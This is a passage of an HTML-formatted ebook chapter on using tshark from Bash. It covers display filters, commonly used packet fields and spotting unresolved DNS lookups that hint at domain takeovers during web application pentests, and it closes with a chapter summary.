    <span class="koboSpan" id="kobo.995.1">
     Here’s a real-world example of a hacker using this for a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.996.1">
      bug bounty:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer061">
     <span class="koboSpan" id="kobo.997.1">
      <img alt="Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity" src="image/B22229_06_13.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.998.1">
     Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.999.1">
     The following command will alert you to potential domain
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1000.1">
      name takeovers:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1001.1">
$ sudo tshark -i eth0 -Y "dns.flags eq 0x8183"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1002.1">
     The following figure shows what you will see when a domain name can’t be resolved by your
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1003.1">
      DNS server:
     </span>
    </span>
   </p>
   <div>
    <div class="IMG---Figure" id="_idContainer062">
     <span class="koboSpan" id="kobo.1004.1">
      <img alt="Figure 6.14 – Example output shows a possible domain takeover opportunity" src="image/B22229_06_14.jpg"/>
     </span>
    </div>
   </div>
   <p class="IMG---Caption" lang="en-US" xml:lang="en-US">
    <span class="koboSpan" id="kobo.1005.1">
     Figure 6.14 – Example output shows a possible domain takeover opportunity
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1006.1">
     If I find this output
    </span>
    <a id="_idIndexMarker401">
    </a>
    <span class="koboSpan" id="kobo.1007.1">
     in my console during my web application pentest, I attempt to locate the resource in the application where this domain is being called
    </span>
    <a id="_idIndexMarker402">
    </a>
    <span class="koboSpan" id="kobo.1008.1">
     by searching my proxy history.
    </span>
    <span class="koboSpan" id="kobo.1008.2">
     Once I find the resource that’s calling the domain, I investigate further to determine whether I can register the domain name and then determine the impact on the application.
    </span>
    <span class="koboSpan" id="kobo.1008.3">
     This is a possible domain
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1009.1">
      takeover opportunity.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1010.1">
     Having explored an introduction to capturing and analyzing network traffic, let’s move into the next section and dive deeper into
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1011.1">
      packet captures.
     </span>
    </span>
   </p>
   <h2 id="_idParaDest-123">
    <a id="_idTextAnchor163">
    </a>
    <span class="koboSpan" id="kobo.1012.1">
     Interpreting packet captures
    </span>
   </h2>
   <p>
    <span class="koboSpan" id="kobo.1013.1">
     Tshark fields allow you to specify which specific pieces of information you want to extract and display from the
    </span>
    <a id="_idIndexMarker403">
    </a>
    <span class="koboSpan" id="kobo.1014.1">
     captured packets.
    </span>
    <span class="koboSpan" id="kobo.1014.2">
     By using fields, you can focus on the relevant data and filter out the noise, making it easier to
    </span>
    <a id="_idIndexMarker404">
    </a>
    <span class="koboSpan" id="kobo.1015.1">
     analyze and interpret the network traffic.
    </span>
    <span class="koboSpan" id="kobo.1015.2">
     There are two basic ways to use fields: display (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1016.1">
      -e
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1017.1">
     ) and filter (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1018.1">
      -Y
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1019.1">
     ) fields.
    </span>
    <span class="koboSpan" id="kobo.1019.2">
     Display fields specify what you want to display in the output.
    </span>
    <span class="koboSpan" id="kobo.1019.3">
     Filter fields provide a way to filter for traffic that matches
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1020.1">
      a pattern.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1021.1">
     The following should simplify the difference between display and
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1022.1">
      filter fields:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1023.1">
       -e
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1024.1">
      extracts specific fields from
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1025.1">
       packet dissection
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1026.1">
       -Y
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1027.1">
      applies a display filter
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1028.1">
       to packets
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1029.1">
       -e
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1030.1">
      selects what to display,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1031.1">
       -Y
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1032.1">
      filters
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1033.1">
       what’s displayed
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1034.1">
       -e
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1035.1">
      is used for the output format,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1036.1">
       -Y
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1037.1">
      for
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1038.1">
       conditional filtering
      </span>
     </span>
    </li>
    <li>
     <span class="koboSpan" id="kobo.1039.1">
      Use both to extract filtered fields:
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1040.1">
       -Y "http.request" -
      </span>
     </strong>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1041.1">
        e http.host
       </span>
      </strong>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.1042.1">
     For example, to display only the source and destination IP addresses of each packet, you would use the
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1043.1">
      following command:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1044.1">
$ tshark -e ip.src -e ip.dst</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1045.1">
     To apply a filter based on a field value, you can use the
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1046.1">
      -Y
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1047.1">
     or
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1048.1">
      --display-filter
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1049.1">
     option followed by the filter expression.
    </span>
    <span class="koboSpan" id="kobo.1049.2">
     For example, to display only HTTP traffic, you can use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1050.1">
      the following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1051.1">
$ tshark -Y "http"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1052.1">
     You can combine field filters with logical operators such as
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1053.1">
      and
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1054.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1055.1">
      or
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1056.1">
     , and
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1057.1">
      not
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1058.1">
     to create more complex filter expressions.
    </span>
    <span class="koboSpan" id="kobo.1058.2">
     For example, to display only HTTP traffic originating from a specific IP address, you
    </span>
    <a id="_idIndexMarker405">
    </a>
    <span class="koboSpan" id="kobo.1059.1">
     can use
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1060.1">
      the following:
     </span>
    </span>
   </p>
   <pre class="console"><span class="koboSpan" id="kobo.1061.1">
$ tshark -Y "http and ip.src == 192.168.1.100"</span></pre>
   <p>
    <span class="koboSpan" id="kobo.1062.1">
     There are hundreds of fields available in Tshark across all the different protocols it understands.
    </span>
    <span class="koboSpan" id="kobo.1062.2">
     However, as a cybersecurity professional, you’ll find yourself using a core set of fields most of
    </span>
    <a id="_idIndexMarker406">
    </a>
    <span class="koboSpan" id="kobo.1063.1">
     the time.
    </span>
    <span class="koboSpan" id="kobo.1063.2">
     Here are the Tshark fields I’ve used most often in
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1064.1">
      my work:
     </span>
    </span>
   </p>
   <ul>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1065.1">
       ip.src
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1066.1">
      : The source
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1067.1">
       IP address
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1068.1">
       ip.dst
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1069.1">
      : The destination
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1070.1">
       IP address
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1071.1">
       ip.proto
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1072.1">
      : The IP protocol (TCP, UDP,
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1073.1">
       ICMP, etc.)
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1074.1">
       tcp.srcport
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1075.1">
      : The TCP
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1076.1">
       source port
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1077.1">
       tcp.dstport
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1078.1">
      : The TCP
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1079.1">
       destination port
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1080.1">
       udp.srcport
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1081.1">
      : The UDP
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1082.1">
       source port
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1083.1">
       udp.dstport
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1084.1">
      : The UDP
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1085.1">
       destination port
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1086.1">
       frame.time
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1087.1">
      : The timestamp of when the packet
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1088.1">
       was captured
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1089.1">
       http.request.method
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1090.1">
      : The HTTP request method (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1091.1">
       GET
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1092.1">
      ,
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1093.1">
        POST
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1094.1">
       , etc.)
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1095.1">
       http.request.uri
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1096.1">
      : The URI of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1097.1">
       HTTP request
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1098.1">
       http.user_agent
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1099.1">
      : The User-Agent string of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1100.1">
       HTTP client
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1101.1">
       http.host
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1102.1">
      : The Host header of the
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1103.1">
       HTTP request
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1104.1">
       dns.qry.name
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1105.1">
      : The hostname queried in a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1106.1">
       DNS request
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1107.1">
       dns.resp.name
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1108.1">
      : The hostname returned in a
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1109.1">
       DNS response
      </span>
     </span>
    </li>
    <li>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1110.1">
       dns.resp.type
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1111.1">
      : The query type of a DNS response (
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1112.1">
       A
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1113.1">
      ,
     </span>
     <strong class="source-inline">
      <span class="koboSpan" id="kobo.1114.1">
       AAAA
      </span>
     </strong>
     <span class="koboSpan" id="kobo.1115.1">
      ,
     </span>
     <span class="No-Break">
      <strong class="source-inline">
       <span class="koboSpan" id="kobo.1116.1">
        CNAME
       </span>
      </strong>
     </span>
     <span class="No-Break">
      <span class="koboSpan" id="kobo.1117.1">
       , etc.)
      </span>
     </span>
    </li>
   </ul>
   <p>
    <span class="koboSpan" id="kobo.1118.1">
     The source and destination IP address fields (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1119.1">
      ip.src
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1120.1">
     /
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1121.1">
      dst
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1122.1">
     ) are useful for identifying the endpoints involved in the
    </span>
    <a id="_idIndexMarker407">
    </a>
    <span class="koboSpan" id="kobo.1123.1">
     communication.
    </span>
    <span class="koboSpan" id="kobo.1123.2">
     You can quickly spot suspicious IPs or track conversations
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1124.1">
      between hosts.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1125.1">
     The IP protocol field (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1126.1">
      ip.proto
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1127.1">
     ) tells you whether the traffic is TCP, UDP, ICMP, or something else.
    </span>
    <span class="koboSpan" id="kobo.1127.2">
     This helps categorize the traffic at a
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1128.1">
      high level.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1129.1">
     The source and destination port fields (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1130.1">
      tcp.srcport
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1131.1">
     ,
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1132.1">
      udp.dstport
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1133.1">
     , etc.) identify the network service being used, such as HTTP on port
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1134.1">
      80
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1135.1">
     , HTTPS on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1136.1">
      443
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1137.1">
     , DNS on
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1138.1">
      53
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1139.1">
     , and so on.
    </span>
    <span class="koboSpan" id="kobo.1139.2">
     Monitoring these can reveal unauthorized services on
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1140.1">
      your network.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1141.1">
     The
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1142.1">
      frame.time
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1143.1">
     field adds
    </span>
    <a id="_idIndexMarker408">
    </a>
    <span class="koboSpan" id="kobo.1144.1">
     a timestamp to each packet, which is critical for analyzing the sequence of events and spotting things such as replay attacks or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1145.1">
      password guessing.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1146.1">
     For investigating web traffic, the HTTP method, URI, user agent, and host fields provide insight into potentially malicious requests, vulnerable web apps, malware C2 traffic,
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1147.1">
      and more.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1148.1">
     Finally, the DNS query and response fields are invaluable for incident response and threat hunting, allowing you to track domain lookups that could be associated with malware or
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1149.1">
      data exfiltration.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1150.1">
     There are many other useful fields, but these are the ones I lean on the most.
    </span>
    <span class="koboSpan" id="kobo.1150.2">
     Combine them with Tshark’s powerful filtering capabilities and you have an indispensable tool for inspecting suspicious traffic, investigating incidents, and hunting
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1151.1">
      for threats.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1152.1">
     Mastering Tshark takes practice, but it’s well worth the effort.
    </span>
    <span class="koboSpan" id="kobo.1152.2">
     Being able to quickly parse out relevant details from raw network traffic is a core skill for cybersecurity analysts and pentesters.
    </span>
    <span class="koboSpan" id="kobo.1152.3">
     Knowing your way around these common fields is a great start.
    </span>
    <span class="koboSpan" id="kobo.1152.4">
     From there, you can dig into more advanced protocol-specific fields
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1153.1">
      as needed.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1154.1">
     The nice thing about Tshark is that it’s extremely flexible; if there’s a field you need, chances are, Tshark can extract it.
    </span>
    <span class="koboSpan" id="kobo.1154.2">
     Don’t be afraid to explore the full list of fields (
    </span>
    <strong class="source-inline">
     <span class="koboSpan" id="kobo.1155.1">
      tshark -G fields
     </span>
    </strong>
    <span class="koboSpan" id="kobo.1156.1">
     ) and experiment.
    </span>
    <span class="koboSpan" id="kobo.1156.2">
     Over time, you’ll build up your own toolkit of go-to fields and filters that will make you a faster, more effective analyst.
    </span>
    <span class="koboSpan" id="kobo.1156.3">
     Once you’ve become fluent in using Tshark
    </span>
    <a id="_idIndexMarker409">
    </a>
    <span class="koboSpan" id="kobo.1157.1">
     fields, combine them with what you’ve learned about Bash scripting to automate the repetitive, boring stuff and supercharge
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1158.1">
      your career.
     </span>
    </span>
   </p>
   <h1 id="_idParaDest-124">
    <a id="_idTextAnchor164">
    </a>
    <span class="koboSpan" id="kobo.1159.1">
     Summary
    </span>
   </h1>
   <p>
    <span class="koboSpan" id="kobo.1160.1">
     In this chapter, you learned how to leverage Bash to configure, troubleshoot, and exploit networking in Unix/Linux environments.
    </span>
    <span class="koboSpan" id="kobo.1160.2">
     You now have the skills to access network configuration details, interact with various network components, and use Bash scripting to exploit vulnerable
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1161.1">
      network services.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1162.1">
     You started with the networking basics, learning how to identify network configuration details and perform network diagnostics using Bash commands.
    </span>
    <span class="koboSpan" id="kobo.1162.2">
     Then you progressed to scripting network enumeration, automating tools to scan networks and enumerate services.
    </span>
    <span class="koboSpan" id="kobo.1162.3">
     Next, you explored how Bash can be used for network exploitation, crafting scripts to target vulnerabilities.
    </span>
    <span class="koboSpan" id="kobo.1162.4">
     Finally, you got an introduction to analyzing network traffic directly in Bash to extract
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1163.1">
      useful information.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1164.1">
     With the knowledge gained in this chapter, you’re now equipped to write powerful Bash scripts for a wide range of networking tasks, from basic administration to advanced pentest.
    </span>
    <span class="koboSpan" id="kobo.1164.2">
     The skills learned will serve you well whether securing your own networks or testing those
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1165.1">
      of others.
     </span>
    </span>
   </p>
   <p>
    <span class="koboSpan" id="kobo.1166.1">
     In the next chapter, we’ll explore parallel processing to speed up time-sensitive
    </span>
    <span class="No-Break">
     <span class="koboSpan" id="kobo.1167.1">
      Bash scripts.
     </span>
    </span>
   </p>
  </div>
 </body></html>